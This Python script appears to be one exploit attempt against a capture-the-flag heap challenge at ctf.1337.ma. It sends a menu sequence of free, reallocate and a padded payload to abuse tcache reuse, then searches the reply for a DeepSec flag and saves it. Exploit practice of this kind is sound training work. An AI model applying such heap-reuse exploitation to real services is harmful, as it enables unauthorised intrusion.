#!/usr/bin/env python3
"""
Alternative exploit - try reserve BEFORE obliterate
Maybe we need to prep the tcache differently
"""

import socket
import time
import re

def full_recv(s, timeout=1.0):
    """Receive all available data"""
    s.settimeout(timeout)
    data = b''
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data

def exploit_alt_sequence():
    host = 'ctf.1337.ma'
    port = 1338
    
    print(f"[*] Connecting to {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    # Receive banner
    banner = full_recv(s)
    print("[*] Banner received")
    
    # Try: Obliterate, Reserve (same size), Road to salvation
    commands = [
        (b'2\n', "Obliterate"),
        (b'1\n', "Reserve space"),
        (b'38\n', "Size 38"),
        (b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw3th4nds\n', "Payload"),
        (b'3\n', "Road to salvation"),
    ]
    
    for cmd, desc in commands:
        print(f"[*] Sending: {desc}")
        s.sendall(cmd)
        time.sleep(0.3)
        resp = full_recv(s, 0.5)
        print(f"    Response length: {len(resp)} bytes")
    
    # Get final response
    print("[*] Waiting for final response...")
    time.sleep(1)
    final = full_recv(s, 2.0)
    
    full_output = (banner + final).decode(errors='ignore')
    
    s.close()
    
    print("\n" + "="*60)
    print("FULL OUTPUT (last 1000 chars):")
    print("="*60)
    print(full_output[-1000:])
    
    # Look for flag
    match = re.search(r'DeepSec\{[^}]+\}', full_output)
    if match:
        flag = match.group(0)
        print("\n" + "="*60)
        print(f"[+] FLAG: {flag}")
        print("="*60)
        with open('/workspaces/ctf/heap_dyl_jumia/FLAG.txt', 'w') as f:
            f.write(flag + '\n')
        return flag
    else:
        print("\n[-] No flag found")
        # Check for success indicators
        if 'success' in full_output.lower() or 'salvation' in full_output.lower():
            print("[?] Saw success/salvation keywords but no flag format")
        if 'doomed' in full_output.lower() or 'forever' in full_output.lower():
            print("[!] Got 'doomed' message - exploit failed")
        return None

if __name__ == '__main__':
    exploit_alt_sequence()
